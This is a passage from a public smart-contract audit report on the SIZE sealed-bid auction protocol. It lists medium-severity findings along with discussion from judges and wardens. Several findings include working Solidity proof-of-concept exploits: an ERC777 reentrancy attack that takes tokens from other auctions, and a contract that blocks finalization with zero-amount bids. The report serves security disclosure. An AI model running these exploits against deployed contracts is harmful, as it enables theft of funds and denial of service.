}\n```\n\n```solidity\n    uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n    if (quotePerBase >= data.previousQuotePerBase) {\n        // If last bid was the same price, make sure we filled the earliest bid first\n        if (quotePerBase == data.previousQuotePerBase) {\n            uint256 currentMult = uint256(b.quoteAmount) * data.previousBase; //mult for current bid\n            uint256 previousMult = uint256(data.previousQuote) * baseAmount; //mult for the previous bid\n\n            if (currentMult > previousMult) { // current bid is better\n                revert InvalidSorting();    \n            }\n\n            if (currentMult == previousMult && data.previousIndex > bidIndex) revert InvalidSorting();\n        } else {\n            revert InvalidSorting();\n        }\n    }\n\n    ...\n\n    data.previousBase = baseAmount;\n    data.previousQuote = b.quoteAmount;\n```\n\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1309172738):**\n > hmmm....  I think the summary is loss of precision leads to small difference in sorting.  Will leave open for sponsor review, but may be QA without showing a larger impact \n\n**[RagePit (SIZE) confirmed and commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1321318749):**\n > very nice find, although its only a small loss in precision the possibility of unfair sorting should be addressed\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1329859282):**\n > With 1e18 points of precision, the difference between the theoretically correct calculation and the actual calculation is basically non existent. Therefore, impact is purely theoretical, as a competitive bidder could by the same logic over-bid by a tiny amount in the corrected calculation as well. \n> Also, it is worth remembering that quote1 & quote2 are unknown until revealed, when it's too late to over-bid.\n\n**[hansfriese (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330084026):**\n > The definition of a better bid is the seller can earn more quote tokens (even if it's 1 wei) by using the bidder.\n> As we can see from the test, the seller can receive more amount of quote tokens if he uses the worse bidder.\n> It means the sorting method using 1e18 is not good enough.\n> If we implement the suggested comparison method(quote1 &ast; base2 > quote2 &ast; base1), it's impossible to receive more funds by using the worse bidder because the comparison is strict.\n> This issue has no relation to the over-bid and just shows the incorrect sorting logic.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330152376):**\n > Yeah Hans you are very much correct in that sorting logic can theoretically be incorrect. I'm talking about the impact, not the root cause. Don't you agree that the difference in calculation and the fact quote is unknown makes impact completely nullified?\n> \n> Regardless it's a well a spotted sneaky bug.\n\n**[hansfriese (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330163540):**\n > I think we can't say it's 100% impossible to have the above situation although the bidders place a bid without knowing others.\n> \n> It says about the Med risk like below in the document.\n> \n> 2 - Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> I think my test case would be a possible assumption.\n> \n> I feel I am defending my issue too much. I won't reply anymore and will follow the judge's decision.\n> \n> Thanks for your feedback.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1335304455):**\n > Thanks for the comments and fact based discussion which is always welcomed, going to move forward with a M here. \n\n\n\n***\n\n## [[M-04] Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack](https://github.com/code-423n4/2022-11-size-findings/issues/192)\n*Submitted by [ronnyx2017](https://github.com/code-423n4/2022-11-size-findings/issues/192)*\n\nThe createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.\n\n### Proof of Concept\n\nForge test\n\n    // SPDX-License-Identifier: GPL-3.0\n    pragma solidity 0.8.17;\n\n    import {Test} from \"forge-std/Test.sol\";\n\n    import {SizeSealedTest} from \"./SizeSealed.t.sol\";\n    import {ERC777} from \"openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\";\n    import \"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\";\n    import {MockSeller} from \"./mocks/MockSeller.sol\";\n    import {MockERC20} from \"./mocks/MockERC20.sol\";\n\n    contract TaxERC777 is ERC777{\n        uint32 tax = 50; // 50% tax rate\n\n        constructor(string memory name_,\n            string memory symbol_,\n            address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}\n        \n        function mint(address rec, uint256 amount) external{\n            super._mint(rec, amount, \"\", \"\", false);\n        }\n\n        function _beforeTokenTransfer(\n            address operator,\n            address from,\n            address to,\n            uint256 amount\n        ) internal override {\n            if(to == address(0)||from==address(0)){ return;}\n            // tax just burn for test\n            \n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal override {\n            uint tax_amount = amount* tax / 100;\n            _burn(from, tax_amount, \"\", \"\");\n            super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);\n        }\n\n    }\n\n    contract Callback {\n        MockSeller seller;\n        uint128 baseToSell;\n\n        uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;\n        uint128 minimumBidQuote = 1e6;\n        // Auction parameters (cliff unlock)\n        uint32 startTime;\n        uint32 endTime;\n        uint32 unlockTime;\n        uint32 unlockEnd;\n        uint128 cliffPercent;\n\n        uint8 entry = 0;\n        uint128 amount_cut_tax;\n        constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){\n            seller = _seller;\n            baseToSell = _baseToSell;\n            reserveQuotePerBase = _reserveQuotePerBase;\n            minimumBidQuote = _minimumBidQuote;\n            startTime = _startTime;\n            endTime = _endTime;\n            unlockTime = _unlockTime;\n            unlockEnd = _unlockEnd;\n            cliffPercent = _cliffPercent;\n        }\n        function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{\n            if(from==address(0) || to==address(0)){return;}\n            if(entry == 0){\n                entry += 1;\n                amount_cut_tax = baseToSell / 2;\n                seller.createAuction(\n                    amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n                );\n                return;\n            }\n            else if(entry == 1){\n                entry += 1;\n                ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);\n                return;\n            }\n            entry += 1;\n            return;\n            \n        }\n        function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(\"ERC1820_ACCEPT_MAGIC\"));}\n    }\n\n    contract MyTest is SizeSealedTest {\n        \n        IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n        function testCreateAuctionFromErc777() public {\n            TaxERC777 tax777Token;\n            address[] memory addrme = new address[](1);\n            addrme[0] = address(this);\n            tax777Token = new TaxERC777(\"t7\", \"t7\", addrme);\n            \n            seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));\n            Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);\n\n            // just without adding more function to MockSeller\n            vm.startPrank(address(seller));\n            _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(\"ERC777TokensSender\"), address(callbackImpl));\n            tax777Token.approve(address(callbackImpl), type(uint256).max);\n            vm.stopPrank();\n            seller.createAuction(\n                baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n            );\n            uint auction_balance = tax777Token.balanceOf(address(auction));\n            uint128 auction1_amount = get_auction_base_amount(1);\n            uint128 auction2_amount = get_auction_base_amount(2);\n            emit log_named_uint(\"auction balance\", auction_balance);\n            emit log_named_uint(\"auction 1 totalBaseAmount\", auction1_amount);\n            emit log_named_uint(\"auction 2 totalBaseAmount\", auction2_amount);\n            assertGt(auction1_amount+auction2_amount, auction_balance);\n        }\n\n        function get_auction_base_amount(uint id) private returns (uint128){\n            (, ,AuctionParameters memory para) = auction.idToAuction(id);\n            return para.totalBaseAmount;\n        }\n    }\n\nYou should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24`\n\n    forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX\n\nTest passed and print logs:\n\n    ...\n    ...\n        â”œâ”€ [4900] SizeSealed::idToAuction(1) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ [4900] SizeSealed::idToAuction(2) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ emit log_named_uint(key: auction balance, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)\n        â””â”€ â† ()\n\n    Test result: ok. 1 passed; 0 failed; finished in 7.64s\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\ncheck re-entrancy\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1308007344):**\n > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n\n**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1322409870)**\n\n**[ronnyx2017 (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1332282361):**\n > > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n> \n> Hi, thanks, just for explaining in more detail about the exploit. As it says in https://eips.ethereum.org/EIPS/eip-777, \"The token contract MUST register the ERC777Token interface with its own address via [ERC-1820](https://eips.ethereum.org/EIPS/eip-1820).\". The interface of interoperating with ERC1820 registry is built into ERC777 by default. And what the attacker need to do is registering in the ERC1820 registry for his sender/receriver address.\n\n***\n\n## [[M-05] Seller's ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system](https://github.com/code-423n4/2022-11-size-findings/issues/194)\n*Submitted by [c7e7eff](https://github.com/code-423n4/2022-11-size-findings/issues/194), also found by [c7e7eff](https://github.com/code-423n4/2022-11-size-findings/issues/194), [gz627](https://github.com/code-423n4/2022-11-size-findings/issues/240), [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/104), [Lambda](https://github.com/code-423n4/2022-11-size-findings/issues/65), and [rvierdiiev](https://github.com/code-423n4/2022-11-size-findings/issues/170).*\n\nBids are encrypted with the seller's public key. This makes that the seller can see all the bids before they reveal and finalize the auction.\nIf the bids are unsatisfactory the seller can just decide not to honor the auction and not reveal their private key. Even worse, the seller, knowing the existing bids, can choose to fill the auction just beneath the optimal price increasing the clearing price.\n\nAlthough there is a [check](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L140-L142) in the `bid()` function where the bidder cannot submit a bid with the same address as the one used while creating the auction it is trivial to use another address to submit bids.\n\nWhether this results in a net increase of the total amount received is not a limiting factor as they might very well be happy with a lower total amount of quote tokes if it means selling less of the base tokens.\n\nUltimately this means the reserve price for the auction is not respected which would make bidders distrust the system.\nBidders that don't realize this impact stand to pay a much higher price than anticipated, hence the HIGH risk rating.\n\n### Proof of Concept\n\nFollowing test shows the seller knowing the highest price can force the clearing price (`lowestQuote`) to be 2e6 in stead of what would be 1e6.\n`sellerIncreases` can be set to true or false to simulate both cases.\n\n```solidity\n    function testAuctionSellerIncreasesClearing() public {\n        bool sellerIncreases = true;\n        (uint256 sellerBeforeQuote, uint256 sellerBeforeBase) = seller.balances();\n        uint256 aid = seller.createAuction(\n            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n        );\n        bidder1.setAuctionId(aid);\n        bidder2.setAuctionId(aid);\n        bidder1.bidOnAuctionWithSalt(9 ether, 18e6, \"bidder1\");\n        bidder2.bidOnAuctionWithSalt(1 ether, 1e6, \"bidder2\");\n        uint256[] memory bidIndices = new uint[](2);\n        bidIndices[0] = 0;\n        bidIndices[1] = 1;\n        uint128 expectedClearingPrice = 1e6;\n        if (sellerIncreases){\n            //seller's altnerate wallet\n            bidder3.setAuctionId(aid);\n            bidder3.bidOnAuctionWithSalt(1 ether, 2e6, \"seller\");\n            bidIndices = new uint[](3);\n            bidIndices[0] = 0;\n            bidIndices[1] = 2;\n            bidIndices[2] = 1;\n            expectedClearingPrice = 2e6;\n        }          \n        vm.warp(endTime + 1);\n        seller.finalize(bidIndices, 1 ether, expectedClearingPrice);\n        AuctionData memory data = auction.getAuctionData(aid);\n        emit log_named_uint(\"lowestBase\", data.lowestBase);\n        emit log_named_uint(\"lowestQuote\", data.lowestQuote);\n    }\n```\n\n### Recommended Mitigation Steps\n\nA possible mitigation would be to introduce a 2 step reveal where the bidders also encrypt their bid with their own private key and only reveal their key after the seller has revealed theirs.\nThis would however create another attack vector where bidders try and game the auction and only reveal their bid(s) when and if the result would be in their best interest.\nThis in turn could be mitigated by bidders losing (part of) their quote tokens when not revealing their bids.\n\n\n**[0xean (judge) commented on duplicate issue #170](https://github.com/code-423n4/2022-11-size-findings/issues/170#issuecomment-1309013040):**\n> Not sure that wash trading qualifies as H risk as its not very unique to this system and is a risk in many defi trading applications. Will leave open as M for sponsor comment.\n\n**[Ragepit (sponsor) marked duplicate issue #170 as acknowledged and commented](https://github.com/code-423n4/2022-11-size-findings/issues/170#issuecomment-1316099720):** \n> We've accepted this risk that a seller can bid on their own auction and make the clearing price higher because they are trusted to know the bid prices. The % profit may go up but the sold tokens will go down so there's a trade-off for the seller.\n\n\n***\n\n## [[M-06] Attacker may DOS auctions using invalid bid parameters](https://github.com/code-423n4/2022-11-size-findings/issues/237)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-size-findings/issues/237), also found by [&lowbar;141345&lowbar;](https://github.com/code-423n4/2022-11-size-findings/issues/233), [0x1f8b](https://github.com/code-423n4/2022-11-size-findings/issues/43), [0xdapper](https://github.com/code-423n4/2022-11-size-findings/issues/11), [c7e7eff](https://github.com/code-423n4/2022-11-size-findings/issues/197), [chaduke](https://github.com/code-423n4/2022-11-size-findings/issues/78), [codexploder](https://github.com/code-423n4/2022-11-size-findings/issues/107), [corerouter](https://github.com/code-423n4/2022-11-size-findings/issues/207), [cryptonue](https://github.com/code-423n4/2022-11-size-findings/issues/263), [fs0c](https://github.com/code-423n4/2022-11-size-findings/issues/68), [gz627](https://github.com/code-423n4/2022-11-size-findings/issues/275), [HE1M](https://github.com/code-423n4/2022-11-size-findings/issues/126), [hihen](https://github.com/code-423n4/2022-11-size-findings/issues/118), [joestakey](https://github.com/code-423n4/2022-11-size-findings/issues/130), [KIntern&lowbar;NA](https://github.com/code-423n4/2022-11-size-findings/issues/201), [ktg](https://github.com/code-423n4/2022-11-size-findings/issues/85), [ladboy233](https://github.com/code-423n4/2022-11-size-findings/issues/21), [Lambda](https://github.com/code-423n4/2022-11-size-findings/issues/64), [minhtrng](https://github.com/code-423n4/2022-11-size-findings/issues/219), [Picodes](https://github.com/code-423n4/2022-11-size-findings/issues/123), [RaymondFam](https://github.com/code-423n4/2022-11-size-findings/issues/44), [RedOneN](https://github.com/code-423n4/2022-11-size-findings/issues/236), [rvierdiiev](https://github.com/code-423n4/2022-11-size-findings/issues/180), [simon135](https://github.com/code-423n4/2022-11-size-findings/issues/325), [skyle](https://github.com/code-423n4/2022-11-size-findings/issues/13), [slowmoses](https://github.com/code-423n4/2022-11-size-findings/issues/163), [TomJ](https://github.com/code-423n4/2022-11-size-findings/issues/208), [V&lowbar;B](https://github.com/code-423n4/2022-11-size-findings/issues/330), [wagmi](https://github.com/code-423n4/2022-11-size-findings/issues/225), and [yixxas](https://github.com/code-423n4/2022-11-size-findings/issues/102).*\n\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258-L263><br>\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L157-L159><br>\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L280>\n\nBuyers submit bids to SIZE using the bid() function. There's a max of 1000 bids allowed per auction in order to stop DOS attacks (Otherwise it could become too costly to execute the finalize loop). However, setting a max on number of bids opens up other DOS attacks.\n\nIn the finalize loop this code is used:\n\n    ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);\n    // If the bidder public key isn't on the bn128 curve\n    if (sharedPoint.x == 1 && sharedPoint.y == 1) continue;\n    bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n    // If the bidder didn't faithfully submit commitment or pubkey\n    // Or the bid was cancelled\n    if (computeCommitment(decryptedMessage) != b.commitment) continue;\n\nNote that pubKey is never validated. Therefore, attacker may pass pubKey = (0,0).\nIn ecMul, the code will return (1,1):\n`if (scalar == 0 || (point.x == 0 && point.y == 0)) return Point(1, 1);`\nAs a result, we enter the continue block and the bid is ignored. Later, the bidder may receive their quote amount back using refund().\n\nAnother way to reach `continue` is by passing a 0 commitment.\n\nOne last way to force the auction to reject a bid is a low quotePerBase:\n\n    uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n    // Only fill if above reserve price\n    if (quotePerBase < data.reserveQuotePerBase) continue;\n\nbaseAmount is not validated as it is encrypted to seller's public key. Therefore, buyer may pass baseAmount = 0, making quotePerBase = 0.\n\nSo, attacker may submit 1000 invalid bids and completely DOS the auction.\n\n### Impact\n\nAttacker may DOS auctions using invalid bid parameters.\n\n### Recommended Mitigation Steps\n\nImplement a slashing mechanism. If the bid cannot be executed due to user's fault, some % their submitted quote tokens will go to the protocol and auction creator.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1308875345):**\n > leaving open for sponsor review, issue is somewhat similar to the baseAmount 0 revert, but is unique enough to stand alone. \n\n**[RagePit (SIZE) commented](https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1331289059):**\n > While possibly an issue in extreme cases, we implemented the `minimumBidQuote` for this reason. As anyone looking to DOS this way would have to lockup `minimumBidQuote*1000` tokens for the duration of the auction\n\n**[RagePit (SIZE) commented](https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1331295562):**\n > Separate from the unintended `#64` issue where the DOS would require no funds locked\n\n***\n\n## [[M-07] Denial of service when `baseAmount` is equal to zero](https://github.com/code-423n4/2022-11-size-findings/issues/332)\n*Submitted by [V\\_B](https://github.com/code-423n4/2022-11-size-findings/issues/332), also found by [0x1f8b](https://github.com/code-423n4/2022-11-size-findings/issues/42), [cccz](https://github.com/code-423n4/2022-11-size-findings/issues/18), [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/93), [ktg](https://github.com/code-423n4/2022-11-size-findings/issues/196), [M4TZ1P](https://github.com/code-423n4/2022-11-size-findings/issues/115), [neumo](https://github.com/code-423n4/2022-11-size-findings/issues/209), [zapaz](https://github.com/code-423n4/2022-11-size-findings/issues/165), and [V&lowbar;B](https://github.com/code-423n4/2022-11-size-findings/issues/332).*\n\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L217><br>\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269><br>\n<https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L44>\n\nThere is a `finalize` function in the `SizeSealed` smart contract. The function traverses the array of the bids sorted by price descending. On each iteration, it [calculates the `quotePerBase`](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269). When this variable is calculated, the whole transaction may be reverted due to the internal logic of the calculation.\n\nHere is a part of the logic on the cycle iteration:\n\n```solidity\nbytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n// If the bidder didn't faithfully submit commitment or pubkey\n// Or the bid was cancelled\nif (computeCommitment(decryptedMessage) != b.commitment) continue;\n\n// First 128 bits are the base amount, last are random salt\nuint128 baseAmount = uint128(uint256(decryptedMessage >> 128));\n\n// Require that bids are passed in descending price\nuint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n```\n\nLet's `baseAmount == 0`, then\n\n```solidity\nuint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, 0);\n```\n\nAccording to the implementation of the `FixedPointMathLib.mulDivDown`, the transaction will be reverted.\n\n### Attack scenario\n\nA mallicious user may encrypt the message with `baseAmount == 0`, then the auction is impossible to `finalize`.\n\n### Impact\n\nAny user can make a griffering attack to invalidate the auction.\n\n### PoC\n\n```solidity\n// SPDX-License-Identifier: MIT OR Apache-2.0\n\npragma solidity =0.8.17;\npragma experimental ABIEncoderV2;\n\nimport {SizeSealed} from \"SizeSealed.sol\";\nimport {ISizeSealed} from \"interfaces/ISizeSealed.sol\";\nimport {ECCMath} from \"util/ECCMath.sol\";\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\";\n\ncontract MintableERC20 is ERC20\n{\n    constructor() ERC20(\"\", \"\") {\n\n    }\n\n    function mint(address account, uint256 amount) public {\n        _mint(account, amount);\n    }\n}\n\ncontract ExternalBidder\n{\n    uint256 constant privateKey = uint256(0xabcdabcd); \n    function createBid(ERC20 quoteToken, SizeSealed sizeSealed, uint256 auctionId, uint128 quoteAmount, uint256 sellerPrivateKey, bytes32 message) external returns (uint256) {\n        quoteToken.approve(address(sizeSealed), quoteAmount);\n\n        (, bytes32 encryptedMessage) = ECCMath.encryptMessage(ECCMath.publicKey(sellerPrivateKey), privateKey, message);\n\n        return sizeSealed.bid(\n            auctionId,\n            quoteAmount,\n            keccak256(abi.encode(message)),\n            ECCMath.publicKey(privateKey),\n            encryptedMessage,\n            \"\",\n            new bytes32[](0)\n        );\n    }\n}\n\ncontract PoC\n{\n    SizeSealed sizeSealed;\n    MintableERC20 token1;\n    MintableERC20 token2;\n    ExternalBidder externalBidder;\n\n    uint256 hackStartTimestamp;\n\n    uint256 firstAuctionId;\n    uint256 secondAuctionId;\n\n    uint256 constant privateKey = uint256(0xc0de1234); \n\n    constructor() {\n        sizeSealed = new SizeSealed();\n        token1 = new MintableERC20();\n        token2 = new MintableERC20();\n        externalBidder = new ExternalBidder();\n    }\n\n    // First transaction\n    function hackStart() external returns (uint256) {\n        require(hackStartTimestamp == 0);\n        hackStartTimestamp = block.timestamp;\n\n        {\n            token1.mint(address(this), 123);\n            token1.approve(address(sizeSealed), 123);\n            firstAuctionId = createAuction(token1, token2, 123);\n            require(firstAuctionId == 1);\n\n            uint256 quoteAmount = 1;\n            uint256 baseAmount = 1;\n            token2.mint(address(this), quoteAmount);\n            token2.transfer(address(externalBidder), quoteAmount);\n            uint256 bidId = externalBidder.createBid(\n                token2,\n                sizeSealed,\n                firstAuctionId,\n                uint128(quoteAmount),\n                privateKey,\n                bytes32(baseAmount << 128)\n            );\n            require(bidId == 0);\n        }\n\n        {\n            token1.mint(address(this), 321);\n            token1.approve(address(sizeSealed), 321);\n            secondAuctionId = createAuction(token1, token2, 321);\n            require(secondAuctionId == 2);\n\n            uint256 quoteAmount = 1;\n            uint256 baseAmount = 0;\n            token2.mint(address(this), quoteAmount);\n            token2.transfer(address(externalBidder), quoteAmount);\n            uint256 bidId = externalBidder.createBid(\n                token2,\n                sizeSealed,\n                secondAuctionId,\n                uint128(quoteAmount),\n                privateKey,\n                bytes32(baseAmount << 128)\n            );\n            require(bidId == 0);\n        }\n\n        return block.timestamp;\n    }\n\n    // external to be used in try+catch statement\n    function finishAuction(uint256 auctionId) external {\n        require(msg.sender == address(this));\n\n        sizeSealed.reveal(auctionId, privateKey, \"\");\n        require(token1.balanceOf(address(this)) == 0);\n\n        uint256[] memory bidIndices = new uint256[](1);\n        bidIndices[0] = 0;\n        sizeSealed.finalize(auctionId, bidIndices, type(uint128).max, type(uint128).max);\n    }\n\n    // Second transaction\n    // block.timestamp should be greater or equal to (block.timestamp of the first transaction) + 1\n    function hackFinish() external returns (uint256) {\n        require(hackStartTimestamp != 0 && block.timestamp >= hackStartTimestamp + 1);\n\n        try this.finishAuction(firstAuctionId) {\n            // expected\n        } catch {\n            revert();\n        }\n\n        try this.finishAuction(secondAuctionId) {\n            revert();\n        } catch {\n            // expected\n        }\n\n        return block.timestamp;\n    }\n\n    function createAuction(ERC20 baseToken, ERC20 quoteToken, uint128 totalBaseAmount) internal returns (uint256) {\n        ISizeSealed.AuctionParameters memory auctionParameters;\n        auctionParameters.baseToken = address(baseToken);\n        auctionParameters.quoteToken = address(quoteToken);\n        auctionParameters.reserveQuotePerBase = 0;\n        auctionParameters.totalBaseAmount = totalBaseAmount;\n        auctionParameters.minimumBidQuote = 0;\n        auctionParameters.pubKey = ECCMath.publicKey(privateKey);\n        \n        ISizeSealed.Timings memory timings;\n        timings.startTimestamp = uint32(block.timestamp);\n        timings.endTimestamp = uint32(block.timestamp) + 1;\n        timings.vestingStartTimestamp = uint32(block.timestamp) + 2;\n        timings.vestingEndTimestamp = uint32(block.timestamp) + 3;\n        timings.cliffPercent = 1e18; \n        \n        return sizeSealed.createAuction(auctionParameters, timings, \"\");\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nAdd a special check to the `finalize` function to prevent errors in cases when `baseAmount` is equal to zero:\n\n```solidity\nif (baseAmount == 0) continue;\n```\n\n**[0xean (judge) commented on duplicate issue #209](https://github.com/code-423n4/2022-11-size-findings/issues/209#issuecomment-1309029156):**\n> I believe there are 2 underlying issues with the finalized routine. the first is bid stuffing, the second is a bid acting as a poison pill. This seems more like a poison pill type bid\n\n**[Ragepit (SIZE) disagreed with severity on duplicate issue #209](https://github.com/code-423n4/2022-11-size-findings/issues/209#issuecomment-1319193715):**\n> Great find, I'd argue M because there's no loss of funds, just wasted time/gas after DOS\n\n**[0xean (judge) replied]():**\n> That is reasonable @RagePit - downgrading.\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 29 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-11-size-findings/issues/57) by **0x1f8b** received the top score from the judge.\n\n*The following wardens also submitted reports: [Aymen0909](https://github.com/code-423n4/2022-11-size-findings/issues/324), \n[brgltd](https://github.com/code-423n4/2022-11-size-findings/issues/321), \n[ajtra](https://github.com/code-423n4/2022-11-size-findings/issues/311), \n[B2](https://github.com/code-423n4/2022-11-size-findings/issues/310), \n[djxploit](https://github.com/code-423n4/2022-11-size-findings/issues/306), \n[lukris02](https://github.com/code-423n4/2022-11-size-findings/issues/303), \n[Deivitto](https://github.com/code-423n4/2022-11-size-findings/issues/302), \n[c7e7eff](https://github.com/code-423n4/2022-11-size-findings/issues/291), \n[RedOneN](https://github.com/code-423n4/2022-11-size-findings/issues/288), \n[0xSmartContract](https://github.com/code-423n4/2022-11-size-findings/issues/287), \n[Josiah](https://github.com/code-423n4/2022-11-size-findings/issues/274), \n[trustindistrust](https://github.com/code-423n4/2022-11-size-findings/issues/270), \n[cryptonue](https://github.com/code-423n4/2022-11-size-findings/issues/267), \n[0xc0ffEE](https://github.com/code-423n4/2022-11-size-findings/issues/258), \n[Trust](https://github.com/code-423n4/2022-11-size-findings/issues/243), \n[simon135](https://github.com/code-423n4/2022-11-size-findings/issues/239), \n[tnevler](https://github.com/code-423n4/2022-11-size-findings/issues/215), \n[peanuts](https://github.com/code-423n4/2022-11-size-findings/issues/193), \n[delfin454000](https://github.com/code-423n4/2022-11-size-findings/issues/184), \n[slowmoses](https://github.com/code-423n4/2022-11-size-findings/issues/183), \n[rvierdiiev](https://github.com/code-423n4/2022-11-size-findings/issues/174), \n[shark](https://github.com/code-423n4/2022-11-size-findings/issues/153), \n[Rahoz](https://github.com/code-423n4/2022-11-size-findings/issues/108), \n[KingNFT](https://github.com/code-423n4/2022-11-size-findings/issues/103), \n[aviggiano](https://github.com/code-423n4/2022-11-size-findings/issues/83), \n[ReyAdmirado](https://github.com/code-423n4/2022-11-size-findings/issues/62), \n[ctf\\_sec](https://github.com/code-423n4/2022-11-size-findings/issues/27), and \n[RaymondFam](https://github.com/code-423n4/2022-11-size-findings/issues/5)\n.*\n\n- **Low risk**\n    - [L-01] Bid balance not ensured\n    - 